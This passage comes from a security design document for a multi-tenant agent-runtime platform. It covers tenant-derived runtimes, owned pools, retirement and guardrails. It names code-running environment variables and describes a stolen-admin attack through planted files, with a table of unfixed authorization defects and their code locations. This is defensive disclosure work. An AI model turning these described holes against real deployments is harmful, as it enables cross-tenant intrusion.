| Inline files and uploads | Default files | A client's file runs in that client's session. A default runs in every session on the runtime with no user choice, so it reaches other users' credentials. |
| Setup commands under the runtime's `setupCommandPolicy` | Default commands under the same policy, with `shell: false` | As above. |
| `runtimeOptions` under the schema | A narrower schema | Narrower only. |
| `pool` among granted pools | The owned pool | A pool the platform templated. |
| `delegationLease` narrowing | `delegationPolicyRef` intersection | Narrower only. |
| Nothing | `maxConcurrentSessions`, recycling, and warm count | New. These act on the owned pool within budget. |
| Nothing | Labels and agent interface | New. These change how the tenant's own environments and agents select the runtime. |

## DR-5: Owned pools

### A pool per runtime

Each tenant-derived runtime has exactly one owned pool, created in the same request and named the same. Its own pool is needed because concurrency and recycling live on the pool row (DF-6), so a one-session policy has no effect on a base's concurrent pods. §5.1's fallback to the base's pool stays unavailable for tenant-derived runtimes: it would place a session on pods with another policy, read another pool's warm inventory, and need a check the base's pool does not make. `ResolvePool` matches the derived name, so owned pools cause no ambiguity for the base. `PoolStoreBasePoolResolver` is unaffected for the same reason.

### Template copy

A platform-written template pool supplies everything that needs a platform decision. A tenant cannot create a ceiling, a posture, or an acknowledgment.

| Setting | Source | Tenant |
| :-- | :-- | :-- |
| `executionMode` | Base | None |
| `isolationProfile`, `allowStandardIsolation`, `acknowledgeNonceOnlyAuth`, `deliveryMode`, `spiffeBinding`, `allowDirectModeStandardIsolation`, and `allowProxyModeSpiffeBindingDisabled` | Template | None |
| `egressProfile`, `dnsPolicy`, egress ceiling, warm-up policy, `gitAccess`, client proxy profile, tunnel lifetime, fetch settings, `tenantOverride`, and `tenantEgressProfiles` | Template | A tenant pool overlay under EG-9's rules for a shared pool. The rows EG-9 gives only an owned pool read as `none` unless the grant entry's `ownedOverlays` lists them. |
| Elicitation policy, `sdkWarm`, and scaling policy | Template | None |
| `resourceClass` | Grant entry | One of `resourceClasses` |
| `warmCount` | Tenant | 1 or more, within budget |
| `maxSessionAgeSeconds` and `sessionPolicy` | Template, then the derived runtime | Lower only, as above |

The copied columns live on the owned row, so `poolPolicyMirror`, admission, and the PoolScalingController read a complete pool with no new merge. A platform write to a template updates the copied columns of its owned pools in the same transaction and bumps each generation. A narrowing therefore reaches them, and the running pods change as any pool edit does today, on pods created afterwards. `ownerTenantId` is set at create and immutable, as `egress-and-git-design.md` decision 26 states.

EG-9's table gives an owned pool more than a shared one: replacing the warm-up policy, turning on `gitAccess`, choosing `egressProfile`, adding a CA, and setting client proxy environment variables. A copied flag was set by an operator thinking of the shared column, so a flag set for file templates would let a tenant set `NODE_OPTIONS` or `LD_PRELOAD`, which this design refuses as `env`. Hence `ownedOverlays`, empty by default. A listed `clientProfile` still sets only variable names from an allowlist the chart ships, the proxy and trust variables, because a denylist stays open: `GIT_SSH_COMMAND`, `PATH`, and `LD_AUDIT` also run code. `egress-and-git-design.md` receives that request.

A write that lowers a `tenantOverride` flag on a pool a grant entry names succeeds whatever overlays exist, on its owned pools and on the template itself. A base entry requires `pool_tenant_access` on the template, so a granted tenant can write an overlay there at any time and would otherwise block the write. The extending part stops applying, and `runtime.base_changed` goes out, under "Notice". EG-9's refusal stays for a shared pool no grant entry names.

A row that reads `none` after an entry drops it, or a profile dropped from `tenantEgressProfiles`, stops the stored value with the same event. `caBundle`, `clientProfile`, `gitAccess`, and `egressProfile` are fixed at pod creation, so they stop on pods created afterwards, and the API reports them as pending, as EG-9 does. `warmUp` is read per decision, so it stops at the next decision and reads as the template's. A dropped `egressProfile` reverts to the template's, which can be wider than the tenant's choice, and the event names it.

### Pods

`createPod` and `resolveSDKWarm` read the `Runtime` resource by `sb.Spec.RuntimeRef`, and a derived runtime has none. DR-2 adds `SandboxTemplate.spec.podRuntimeRef`, which the PoolScalingController sets from the pool row, and every read of the resource in the Sandbox controller keys on it. Otherwise `resolveSDKWarm` reads a miss as `preConnect` false, and an owned pool on an SDK-warm base warms as pod-warm. `runtimeRef` keeps the derived name for `ResolvePool` and the label. A base's `Runtime` resource therefore serves any number of derived pools, and no tenant input reaches a cluster-scoped resource.

Pods serve only the owner. The controller stamps `lenny.dev/tenant-id` with the owner at creation, as the "Pod models" row in `egress-and-git-design.md` states, and egress decisions, warm-up additions, and egress groups then read one tenant from the first second. `requirePoolSelectable` and the claim path read the owner, so another tenant's pin fails as an unknown pool.

That stamp does not work against today's code, and the design has to resolve this. These readers treat a non-empty label as "this pod has served a session":

- `AdmitTenantPin` refuses and drains every labelled pod when the pool does not reuse pods, so a one-session owned pool would drain each warm pod at its first acquisition.
- `markPinnedIdle` and §5.2 **Pinned idle inventory.** keep labelled idle pods out of `minWarm` and, with `maxWarm` equal to the target, drain them. The pool would stay in `PoolWarmingUp`.

DR-5 adds `lenny.dev/served`, which the gateway stamps at first assignment on an owned pool. On an owned pool both readers read that label in place of the tenant label: an unserved pod is ordinary inventory, and a served pod is refused and drained on a non-recycling pool. Another tenant's request never reaches this check on an owned pool, and `AdmitTenantPin` keeps the pin comparison as the second layer.

### Bounds

| Bound | Holder | Enforcement |
| :-- | :-- | :-- |
| `maxRuntimes` | Grant | Checked at write, under a lock on the grant row, so concurrent creates cannot pass together. |
| `maxOwnedPods`, at write | Grant | A write raising the sum of `warmCount` across the tenant's owned pools needs the active count, which the next row defines, plus the new sum to stay below it, under the same lock, so one claim can still pass. A lowering always passes. |
| `maxOwnedPods`, at claim | Grant | A claim that takes a new pod needs the tenant's active pods plus that sum to stay below it. Otherwise it answers `429 QUOTA_EXCEEDED`. Active pods are the Sandboxes of its owned pools in phases `claimed`, `reserved`, `draining`, and `failed`, from a list per owned pool. The warm sum covers `idle`, `warming`, and `sdk_connecting`, which `plan.Compute` treats as inventory, and `terminated` is a sink that holds no pod. `agent_pod_state` cannot serve, because `derivePodStates` leaves `tenant_id` empty and each sync clears it. A `ClaimSlot` on an occupied pod adds no pod and is exempt. The count is not serialized, so overshoot is bounded by concurrent claims. |
| `runtimes.tenantDerivation.maxOwnedPodsTotal` | Helm | The sum of every grant's `maxOwnedPods` stays at or below it, checked at grant write under one lock that only grant writes take. Preflight compares it with the namespace `ResourceQuota`. |
| Pod size | `resourceClasses` | Set per base in the grant. `LimitRange` still applies. |

`max_concurrent_sessions` does not serve as this bound. A quota of 1000 moved from 20-session pods to one-session pods turns 50 pods into 1000.

The PoolScalingController never raises an owned pool above `warmCount`. Its formula is clamped, `bootstrapMinWarm` is refused, and an experiment's `initialMinWarm` on an owned pool is refused at write, because `ResolveVariantRoles` assigns it to `MinWarm` directly. A concluded experiment drains its owned variant pool, which affects only the owner. Warm-pod minutes accrue per pool, so an owned pool's idle cost is attributable to its owner through the pool row. Whether the billing pipeline should read that is the operator's commercial choice.

### Kubernetes permissions

The gateway needs none. It writes Postgres, and the PoolScalingController renders the CRD pair with the permissions it holds. The WarmPoolController creates pods with the label in place, which EG-9's `unset → owner` webhook rule admits. No tenant write creates a `Runtime` resource. A `RuntimeClass`, a namespace, and a NetworkPolicy are all fixed by Helm, and §13.2.6's pre-created policies apply, because `egressProfile` comes from the template.

### Tenant operations

A tenant writes its owned pool's fields only through `PUT /v1/admin/derived-runtimes/{name}`, and drains it through that resource's `drain` route. The pool routes `drain`, `warm-count`, `circuit-breaker`, `resume-reconciliation`, and `upgrade` remain `platform-admin` paths on owned pools, as DR-1 makes them on all pools. `pool_tenant_access` and `runtime_tenant_access` refuse a row naming an owned record, so a grant cannot share it.

### Tenant suspension and deletion

Suspending a tenant adds a reason to `warm_stop_reasons` on its owned rows in the same transaction, and resuming removes it. §15.1 blocks deleting a tenant while pools exist under it, which would stop erasure. Owned pools leave that block, and the deletion lifecycle drains and removes them in §12.8's order.

## DR-6: Base changes

Today a base write that would invalidate a derived runtime is refused and names the affected runtimes. For a tenant-derived runtime that lets one tenant block a platform change and shows one tenant's names to whoever wrote the base. `derivedRuntimesInvalidatedBy` keeps its rule for platform-owned derived runtimes only.

For a tenant-derived runtime, the restrict-only rules move from a one-time check to the merge. The tenant view computes the effective runtime against the live base and the current grant entry, on each resolve, and reads a retirement reason on the owned row as `retired`, so re-issuing an entry after its date does not revive the runtime. A base or grant write therefore always succeeds and takes effect at the next resolve. `incompatible` means new sessions answer `409 DERIVED_RUNTIME_UNAVAILABLE`, with `details.reason` naming the miss, until the cause is fixed.

| Platform change | Effect on a tenant-derived runtime |
| :-- | :-- |
| Narrows `supportedProviders`, `allowSelfRecursion`, `limits`, or the schema | Applies at the next resolve. An emptied intersection, such as no provider left, is `incompatible`. |
| Narrows `setupCommandPolicy` so a default command falls outside, or sets `shell: true` or a mode other than `allowlist` while a default command exists | `incompatible`, until the tenant edits the command. |
| Removes the base's `allowedResourceClasses` entry the pool uses, sets `executionMode: service`, or sets `requireSoPeercred` false | `incompatible`. The base no longer meets the entry's conditions. |
| Removes the base's `Runtime` resource | The owned pool creates no pods, and the claim path answers as for a pool with none. The finalizer soft-deletes the base row, and the tenant view reads that as `retired`. |
| Sets the base's `type` to `mcp` or its `deploymentModel` to `embedded` while the runtime holds a default | `incompatible`. The tenant view reads both from the base row. `deploymentModel` is on the `Runtime` resource alone today (`applyCRDFields`), so the RuntimeReconciler mirrors it, as it mirrors `restartable`, with empty stored as `sidecar`. |
| Leaves the base's `Runtime` resource at `Registered=False` | `incompatible`. `mirror` refuses such a resource and leaves the row stale, and the Sandbox controller does not read the condition, so the RuntimeReconciler records it in `registered` on the row. |
| Changes base `workspaceDefaults` or `labels` | Applies to plans bound afterwards, and to selectors at once. |
| Changes a template pool | Copied under "Template copy". A lowered `maxConcurrentSessions` lowers the owned value. |
| Sets `allowSetupCommands` or `allowWorkspaceFiles` false while the runtime holds that default | `incompatible`, until the tenant removes it. This is the stop after a compromise. |
| Narrows `resourceClasses` | `incompatible`, until the tenant picks another class. |
| Changes an entry's `templatePool` | The grant write copies the new template's columns to the owned pools in its transaction. |
| Lowers `maxOwnedPods` below the sum of `warmCount` | The grant write lowers each owned `warmCount`, in name order and to a minimum of 1, until the sum fits or none can go lower, and emits the event. Later claims answer `QUOTA_EXCEEDED`, and pods above the bound end with their sessions. |
| Lowers `maxRuntimes` below the current count | Existing runtimes stay, and a create is refused. |
| Retires a base, or sets a grant entry's `retireAt` | The retirement path below. |
| Removes an entry, or revokes access on its base or template, after the entry's date | The runtimes stay `retired`. |

A template cannot be deleted while a grant entry names it: `DELETE` answers `409 RESOURCE_HAS_DEPENDENTS`. An operator retires a template by changing the entry to another template, or by setting the entry's `retireAt`.

A running session keeps its plan through any of these, because §14.1 stores the composed plan, and every later materialization reads it. "Residual risks" states what that means for a stopped default.

**Notice.** Each write that can change a tenant-derived runtime's effective result, or the effect of a stored overlay, adds an outbox row in its own transaction. A worker scans the affected runtimes and every tenant with a stored overlay on the pool, grant or no grant, emits `runtime.base_changed` to each one's audit chain, so subscriptions and an SO-3 destination receive it, and retries until it has done so. Reads show `baseStatus` at once, because resolve is the authority. The platform write's response lists affected runtimes and tenants to the `platform-admin`, and its failure to list them does not fail the write.

**Retirement.** `POST /v1/admin/runtimes/{name}/retire` takes `effectiveAt`, which must lie at least `runtimes.tenantDerivation.baseRetirementNoticeSeconds` ahead, 30 days by default.

- From the call, new derivations are refused, `baseStatus` reads `retiring` with the date, and the event goes out. Existing runtimes keep working.
- At `effectiveAt`, `baseStatus` reads `retired`, new sessions answer `409 DERIVED_RUNTIME_UNAVAILABLE`, and the owned pools drain. Running sessions end under their own age limits. `DELETE` on the base no longer counts tenant-derived runtimes as dependents, and §15.1's rule for non-terminal sessions still holds the row. The base's `Runtime` resource stays until its last pod ends.
- `emergency: true` with a `ticketId` makes `effectiveAt` now, for a compromised image. It refuses new sessions at once, and SO-4a mirrors it. `force: true` also ends running sessions.

`retire_at` on the base row holds the date. A `platform-admin` cancels a pending date before it arrives.

Per tenant, the carrier is a grant entry's `retireAt`, set through `PUT .../derivation-grant` under the same notice floor, with `emergency: true`, a `ticketId`, and optionally `force: true` in that body for the emergency form. Withdrawing a grant sets `retireAt` on each entry. An entry's date counts as passed once its base's `retire_at` has passed. While an entry has tenant-derived runtimes and its date has not passed, a grant write cannot remove the entry, and `DELETE .../tenant-access/{tenantId}` on its base or template answers `409 RESOURCE_HAS_DEPENDENTS`, because that route deletes the row with no date to hold. The operator's own entry holds this refusal, so it comes from no tenant.

**Who drains.** `warm_stop_reasons` on the owned row is the one signal the controller reads. `PoolStoreSource` reads pool rows, so it maps a non-empty value to its existing `ForceZeroMinWarm` and sets `MaxWarm` to 0, because `plan.pinnedOverBound` otherwise keeps served idle pods. The transaction that sets `suspended_by`, a tenant suspension, or an emergency adds its reason, and the Notice worker adds one when a date arrives. Only the source of a reason removes it. A tenant's `PUT` touches the column in one case: a `PUT` that complies with the guardrail passes EG-9's write path, which clears `suspended_by` and its reason. Retirement is terminal for those runtimes, so its reason has no removal, and a tenant creates a new runtime under a live base.

## DR-8: Interactions

### Environments

A tenant view runs first, so an environment's `runtimeSelector` only ever sees what the tenant can reach. This also closes the case where `Selector.Matches` with an empty selector admits every registered runtime in the deployment.

`Merge` overlays labels, so a new derived runtime inherits the base's labels and joins every environment whose selector matches them, with its default commands. A write answers with a `Warning` listing the environments that admit it and any `dangerouslyShare` selector that matches it, as `tenant-scoping-identity-design.md` does for its writes. A tenant admin separates a runtime by overriding a label's value or with `exclude`, because the merge cannot remove a base key.

`ENVIRONMENT_REQUIRED` and `ENVIRONMENT_POLICY_NOT_ENFORCEABLE` read the final runtime and pool on the tenant view, under that design's rule for the final row. An owned pool at one session per pod with no recycling evaluates with E's full policy, and so does one with recycling, under the residual that design's decision 5 accepts. An owned pool lowered to a value above 1 stays a pod with no per-session policy, and the rule refuses as it does for any such pod. The `Warning` for an environment's first entry gains the name of the template-eligible bases, so a tenant admin learns the route.

### Experiments

Experiments are tenant-scoped, and DR-1 states which pools they can name. An experiment can name the tenant's own derived runtime as `baseRuntime` and an owned pool as a variant. A variant reaches an owned pool by setting `variant.Runtime` to the derived name. `variant.Pool` does not steer an exclusive claim, because `claimAtCreate` resolves with `row.RuntimeRef` and `row.Pool`, and `claimForNewRow` then overwrites `row.PoolRef`. Routing re-checks the variant on the final row, with the checks `tenant-scoping-identity-design.md` already re-runs there and the tenant-view check under "Reading", and the pin refuses another tenant's pod at claim. A grant revoked after the experiment's write therefore stops its sessions and delegated children.

### Delegation

`resolveDelegationTarget` and `runtimeAuthorizedForCaller` read through the tenant view with the parent's tenant, so another tenant's name answers `TARGET_NOT_IN_SCOPE`. `runtimeAuthorizedForCaller` returns true on a read error today (F-10.6.23), and a tenant-view miss would reach that branch, so DR-8 depends on TS-3's fail-closed gate. `DelegationPolicy` allow lists are tenant-scoped, and a label or `ids` entry matches a derived runtime as it does any other. Isolation monotonicity applies on the owned pool's copied profile.

### Cross-environment sharing

A tenant-derived runtime can be a path's target under decision 14. The child runs under T's policy on the owned pool, and its default commands are the tenant admin's. A label edit can add it to a declared path at once, which is the residual that design already states, and the `Warning` above reports it. Sharing never crosses a tenant, because environments are per tenant.

### Per-tenant capability overrides

`runtime-capability-overrides` applies on top of the effective runtime, once `ResolveForTenant` and the `PUT` handler read the tenant view. A tenant can already override `capabilities.interaction` and injection for its own sessions on any runtime, so the prohibition on a derived runtime's `capabilities` does not stop that surface. This design leaves it as it is.

## DR-7: Security oversight and records

**Guardrail.** The SO-2 record gains one constraint:

```json
"derivedRuntimes": { "forbid": ["all"] }
```

The values are `all`, `setupCommands`, `workspaceFiles`, `recycle`, and `concurrency`. As with the other constraints, the platform grants the class and the tenant's security team can still forbid it. Stopping tenant code takes both `setupCommands` and `workspaceFiles`, because a file is code. `verbatimClientFiles: forbid` also forbids `workspaceFiles`, because both put arbitrary content in the pod, and a `security-admin` who set it expects that channel closed.

- A violating write answers `422 GUARDRAIL_VIOLATION`.
- A tightening sets `suspendedBy` on each non-compliant derived runtime. A suspended runtime leaves discovery, new sessions answer `409 DERIVED_RUNTIME_UNAVAILABLE`, and its pool stops warming and drains. Running sessions continue, under the residual "A stored plan outlives a stop".
- Removing a forbid is a weakening, with SO-2's delay. Creating a derived runtime is not a weakening by itself (decision 9).

**Posture.** A new `derivedRuntimes` section reports each runtime's name, base, `baseStatus`, count and digest of default commands and files, `maxConcurrentSessions`, recycling, last writer, and last change. `gates` reports the grant, its limits, and current use. `pools` already reports `ownerTenant`.

**Records.** `admin.runtime.updated` carries `changedFields` alone today. The new events, `admin.derived_runtime.created`, `.updated`, and `.deleted`, carry the owner, the base, the version, the full text of each setup command, each file's path and digest, and before and after values for `sessionPolicy` and the pool's `warmCount`. Command text belongs in the record, because it is what ran in every session. File content stays out, because a tenant can place sensitive data there against the documentation, and the composed plan already holds it per session. `derivation-grant` writes and retirement emit their own events. A `platform-admin`'s write to a tenant-derived runtime uses the same route and is mirrored under SO-4a.

## Configuration by scope

| Setting | Description | Scope | Managed by |
| :-- | :-- | :-- | :-- |
| `runtimes.tenantDerivation.enabled` | Whether a new grant or a raise is accepted. False by default. | Deployment | Platform admin (Helm) |
| `runtimes.tenantDerivation.maxOwnedPodsTotal` | The limit on the sum of every grant's `maxOwnedPods`. | Deployment | Platform admin (Helm) |
| `runtimes.tenantDerivation.baseRetirementNoticeSeconds` | The minimum notice for a retirement. 2592000 by default, which is a judgment. | Deployment | Platform admin (Helm) |
| `runtimes.tenantDerivation.maxWorkspaceDefaultsBytes` | The size bound on a derived runtime's default files. | Deployment | Platform admin (Helm) |
| `derivation-grant` (`namePrefix`, `maxRuntimes`, `maxOwnedPods`, and `bases[]` with `allowWorkspaceFiles`, `allowSetupCommands`, `ownedOverlays`, and `retireAt`) | What the tenant can derive from, under which template, with which defaults and overlays, and up to what limits. | Tenant | Platform admin (admin API) |
| Template pool | The source of every copied pool setting. | Pool | Platform admin |
| Derived runtime fields and `pool` block | Under "Fields" and "Template copy". | Runtime in a tenant | Tenant admin, or a custom role with `manage_derived_runtimes` |
| `derivedRuntimes` in the security record | What the tenant's security team forbids. | Tenant | `security-admin` |
| Environment selector | Whether an environment admits the runtime. | Environment | Tenant admin |

Every setting in `egress-and-git-design.md` and `tenant-scoping-identity-design.md` stays as written there.

## Scenarios

**An environment's route to one-session pods.** The platform has granted `acme` the base `chat` with template pool `chat-shared`, which serves concurrent sessions. Environment `payments` denies `huggingface.co`, so Bob's create on `chat` in `payments` fails with `ENVIRONMENT_POLICY_NOT_ENFORCEABLE`, and the `Warning` from the policy write named `chat` as affected and as a base with a route. Alice, a `tenant-admin`, posts this:

```yaml
name: acme--chat-payments
baseRuntime: chat
labels: { environment: payments, approved: "false" }
sessionPolicy: { maxConcurrentSessions: 1, recycle: { enabled: false } }
pool: { warmCount: 2, resourceClass: small }
```

The response warns that `payments` admits the runtime. The controller creates two pods from `chat`'s `Runtime` resource, labelled for `acme`. Bob's create succeeds on a one-session pod with `payments`' full policy. The grant sets neither default flag, so no tenant code runs, and this route does not need DR-3.

**Another tenant.** An administrator of `globex` posts `name: acme--x` and gets `422 INVALID_DERIVED_RUNTIME`, and a post under `globex--x` with no grant gets `403 DERIVATION_NOT_GRANTED`. A `globex` user creating a session on `acme--chat-payments` gets the answer for an unknown runtime, and `GET /v1/runtimes` does not list it. A `globex` experiment naming that pool as a variant gets the unknown-pool answer.

**A raised concurrency value.** The template serves 20 concurrent sessions. Alice asks for 25 and gets `422 INVALID_DERIVED_RUNTIME`, with `details.field: sessionPolicy.maxConcurrentSessions`. A `platform-admin` raising the template's value is the path to more.

**A budget reached.** `acme` holds `maxOwnedPods: 20`, with warm counts summing to 8 and 11 active pods. Bob's claim passes, because 19 is below 20, and makes 12 active. Carol's claim answers `429 QUOTA_EXCEEDED`, though warm pods sit idle. With those 12 active pods, a write taking the warm sum from 8 to 9 answers `422 DERIVATION_BUDGET_EXCEEDED`, with the current use, because 21 passes 20. A write lowering the sum passes.

**A base retired.** An operator retires `chat` with 30 days' notice. `acme`'s audit chain and SIEM destination receive `runtime.base_changed`, and `GET` shows `baseStatus: retiring`. Sessions continue. After the date, new sessions answer `409 DERIVED_RUNTIME_UNAVAILABLE`, the owned pool drains, and running sessions finish under their limits. Alice has moved `payments` to another base by then.

**A stolen `tenant-admin`.** A grant with neither flag refuses the attacker's default file and command. Under a grant with `allowWorkspaceFiles`, the attacker writes a `requirements.txt` that a base command installs, or a hook the runtime loads, and that code runs at the agent UID in each new session. It can read a `file` token and use an `inject` token. The audit event carries the file's path and digest, and an SO-3 destination receives it at once. `derivedRuntimes.forbid` with `workspaceFiles` and `setupCommands` refuses the write. Otherwise an operator sets the flag false, which makes the runtime `incompatible` for new sessions, or a `security-admin` adds the forbid. The composed plan on each session row records which sessions ran it.

## Residual risks

- **A tenant admin's reach.** A `tenant-admin` can write defaults that run in every session on a derived runtime, including in an environment it does not belong to, because `tenant-scoping-identity-design.md` already leaves it able to add itself as a member. Environments give no boundary against a tenant admin. No control bounds what a default file does once a base command or the runtime reads it, and commands within an allowlist can still do what the allowed tools do.
- **No per-session consent.** A user selecting a runtime receives its defaults. The plan on `GET /v1/sessions/{id}` shows them after the fact.
- **Shared capacity.** Budgets bound what a tenant holds. They do not reserve nodes. Tenant-owned pods share nodes and the namespace `ResourceQuota` with every other pool, and a quota reached by any pods stops pods of all pools, which is true of session load today. A `maxOwnedPodsTotal` set below the quota limits this for owned pools alone. The bound is a pod count, so a tenant using `large` holds more than one using `small`.
- **Pod-count overshoot.** The claim check is not serialized, so concurrent claims can pass `maxOwnedPods`.
- **Warm pods after an overlay row drops.** No pod roll is triggered, so warm pods carrying a dropped `caBundle` or `clientProfile` serve new sessions until they are used up.
- **Deleting a base's `Runtime` resource.** The RuntimeReconciler's finalizer soft-deletes the row and bypasses notice and the dependents check. An operator who deletes the resource directly strands tenant-derived runtimes at once, as `retired`.
- **A stored plan outlives a stop.** A grant flag set false, a forbid, or a suspension stops new sessions. §7.3 step 3e rebuilds a session with no checkpoint from its stored plan and runs the plan's setup commands, so an attacker's default runs again in that session. An emergency retirement with `force: true` ends such sessions. Filtering on rebuild would need a per-command source on the stored plan, and that is additive.
- **Trust in the base.** A tenant takes base changes with no approval step, apart from narrowing. A base's `workspaceDefaults` change reaches the tenant's new sessions at once, and a template widening reaches its owned pools in the same transaction. Posture and `runtime.base_changed` report it after the fact.
- **The retirement window.** A base can stay usable for its notice period. A compromised image needs the emergency path, which interrupts tenants.
- **Environment membership through labels.** A runtime enters a selector by inherited labels at create, and a label edit or a base label change alters membership at once. The `Warning` reports it to the writer. A platform's base label edit reaches tenants with only the base-changed event.
- **A compromised gateway replica.** Row-level security limits a tenant-context query. A compromised replica can set any context, write any row, and write any pool. The label and pin layers still refuse another tenant at the pod.
- **Defaults hold no secrets.** A tenant admin can write a secret into a default file against the documentation, and every reader of a session's plan then sees it.
- **Prompt injection inside a tenant.** An agent discovering a derived runtime reads its `agentInterface` text, which a tenant admin wrote.
- **Unproven.** Nothing here has run. That includes the pod path through `podRuntimeRef`, the `lenny.dev/served` readers, and the merge as an intersection.

## Defects found while verifying

These exist independent of this design. Each is filed in `BUILD-GAPS.md` under the F-id in the "Filed as" column, at the severity proposed here. DF-12 has two entries, because its two parts concern different specification sections. "Read" means the evidence comes from reading the code, and nothing was run.

| ID | Filed as | Severity | Defect | Evidence | Closed by |
| :-- | :-- | :-- | :-- | :-- | :-- |
| DF-1 | F-5.1.26 | Critical | A `tenant-admin` holding a grant on a shared runtime can write fields that reach other tenants, including `workspaceDefaults.setupCommands`, which run in other tenants' sessions and are exempt from `setupCommandPolicy`. | `runtimeManage` in `routes.go`, `requireResourceManage`, `applyRuntimeUpdate`, §14.1 **Runtime workspace defaults.**, §7.5 **Command policy:**, and the RuntimeReconciler's `applyCRDFields`. §10.2's **Runtime and pool scoping clarification** permits this write. F-5.2.67 covers pools alone. Read. | DR-1 |
| DF-2 | F-10.6.25 | High | `runtime_tenant_access` does not gate session creation, discovery, or delegation, and `pool_tenant_access` gates only a pinned pool, so a tenant whose environment selector or `allow-all` admits a runtime uses it with no grant. §10.6's "Runtimes owned by other tenants are never exposed" has no data behind it, and §5.1 **First-Party Reference Runtimes** states "no default tenant access grants". | `tenantReachesRuntime` is called only from the internal metadata route. `requireEnvironmentAdmission`, `filterRuntimesByEnvironment`, and `filterByEnvironmentAccess` read no grant. `tenantaccessstore` has no importer under `mcpfabric`. The comment in `pkg/embedded/stack/runtimes.go` saying `tenantReachesRuntime` denies a session is false. Read. | DR-1 |
| DF-3 | F-5.1.27 | High | A pool on a derived runtime, or on a runtime registered only through the admin API, produces no pods. `createPod` reads a `Runtime` custom resource by name, nothing in the admin path writes one, and the CRD has no `baseRuntime`. This is against §5.1's admin API statement and **Derived Runtime Instantiation**. | `createPod`, `handleCreateRuntime`, `runtime_types.go`. The only writers of `Runtime` resources outside tests are the chart's `reference-runtimes.yaml`, the embedded stack, and the reconciler's patch. Read. | DR-2 closes the derived half through `podRuntimeRef`. The admin-registered standalone half stays open, because no base resource exists to point at. |
| DF-4 | F-7.5.17 | High | Setup commands, a client's included, run at the adapter's UID in the adapter's container on a sidecar pod. That container holds the projected service account token and a writable credential volume, and on a concurrent pod the volume holds every slot's file. §7.5 **Security model:** treats the pod as the boundary, §13.1's adapter-agent boundary is a UID check, and a process a setup command starts can outlive it, as §5.2 **What the scrub reaches.** concedes. The command also runs from the adapter's image, so the `pip install` in §5.1's example does not touch the runtime's environment. `DefaultSetupEnv` sets `USER=agent` and does not change the UID, and the comment on `RunSetup` saying "as the agent user" is false. The rating is a floor: what the projected token can do at the gateway was not traced, and a wider reach there raises it. | `RunSetup` in `staging.go`, `workspace.RunSetup` and `buildSetupCmd`, `sidecar.go` mounts, `sa_token.go`. Read. | DR-3, for the adapter's identity. The concurrent-pod credential read stays, as §13.1 states. |
| DF-5 | F-5.1.28 | Medium | §5.1's fallback to the base runtime's pool does not exist, so a derived runtime with no pool answers `ErrNoMatchingPool`. With DF-3, no derived runtime runs a session today. | `ResolvePool`. No use of `BaseRuntime` in `podsession` or the claim path. Read. | DR-2, by changing §5.1 |
| DF-6 | F-5.1.29 | Medium | A runtime's `sessionPolicy` sets no pod behaviour beyond `maxClientIdleSeconds`, though §5.1's example and merge table imply it does. `tenant-scoping-identity-design.md`'s route rests on this. | `poolPolicyMirror`, `toConfig`, `sessionidle.go`, `envelope.go`. Read. | DR-2 |
| DF-7 | F-5.1.30 | Medium | A derived runtime can widen `setupCommandPolicy` and replace `delegationPolicyRef`, because `validateDerivedRuntime` checks neither and `Merge` replaces both. §5.1 says restrict, §8.3 says **Effective policy = `base_policy ∩ derived_policy`**, and `docs/getting-started/concepts.md` says restrict-only. | `validateDerivedRuntime`, `validateDerivedRuntimeUpdate`, `Merge`. Read. | DR-4 for tenant-derived, DR-2 for the rest |
| DF-8 | F-15.1.75 | Medium | `DELETE /v1/admin/runtimes/{name}` checks no pool or session, against §15.1's **Deletion semantics** Runtime rule. A derived runtime on a soft-deleted base still resolves as active, because `Get` returns soft-deleted rows and `Merge` clones the derived row. | `handleDeleteRuntime`, `pgstore.Get`, `Merge`. Read. | DR-6 |
| DF-9 | F-10.7.22 | High | Any `tenant-admin` can drain any pool in the deployment and delete its `SandboxWarmPool`, by naming it as an experiment variant. The controller reads every tenant's experiments and applies effects to any named pool: `paused` sets `ForceZeroMinWarm`, `concluded` sets `DrainAndDelete`, `InitialMinWarm` overwrites `MinWarm`, and `SumActiveVariantWeights` reduces the sole pool warming the base. Variant pools have no `pool_tenant_access` check, and `variant.Runtime` has no grant check, at write or at routing. Two tenants naming one pool make `ResolveVariantRoles` return an error, which stops the adjustment for every tenant. | `ExperimentVariantSource.ListPoolConfigs`, `ResolveVariantRoles`, and `drainAndDeleteWarmPool` in `pkg/controller/poolscaling`. `requireTenantResourceAdmin` on the experiment routes, with `PATCH` accepting `concluded`. `checkVariantIsolation` skips what it cannot resolve. `ApplyExperimentRouting` sets `row.RuntimeRef` from `variant.Runtime`, which steers the claim. It also sets `row.PoolRef` from `variant.Pool`, and `claimForNewRow` overwrites that, so `variant.Pool` does not steer an exclusive claim. Read. | DR-1 |
| DF-10 | F-5.1.31 | Low | A runtime name can be 128 characters, and `createPod` copies it to a pod label, whose value Kubernetes limits to 63. | `namePattern`, `pod.Labels[state.LabelRuntime]`. Read. | DR-1 |
| DF-11 | F-5.2.68 | Low | §5.2 **Pool Taxonomy** describes cold pools with `minWarm` 0 and `maxWarm` above 0, and `PoolStoreSource` maps both from `warmCount`, so a pool at 0 has no pods. | `toConfig`. Read. | Not in this design. It sets the 1-pod minimum, and a fix relaxes that. |
| DF-12 | F-5.1.32 for the merge table, F-10.2.43 for the quota row | Low | §5.1's merge table omits `workspaceTier`, `sdkWarmBlockingPaths`, `archivePolicy`, `toolCapabilityOverrides`, and `description`. A derived payload's `sdkWarmBlockingPaths` is accepted and discarded. §10.2's matrix gives `tenant-admin` "Manage quotas", and the tenant update route that holds `max_concurrent_sessions` uses `requireAdmin`. | `RuntimePayload`, `Merge`, `routes.go`. Read. | DR-4 for the table. The quota row is not in this design. |
| DF-13 | F-8.3.13 | Medium | The delegation policy deletion guard ignores the tenant. Policies are keyed on `(tenant_id, name)`, and `delegationPolicyRuntimeDependents` takes a name alone, so a platform runtime referencing `strict` blocks every tenant's delete of its own `strict`, and the answer names that runtime to a tenant with no grant on it. | `delegationPolicyRuntimeDependents`, `handleDeleteDelegationPolicy`, which a `tenant-admin` reaches and which runs the guard before reading the policy, and migration `0054`. Read. | DR-4 |
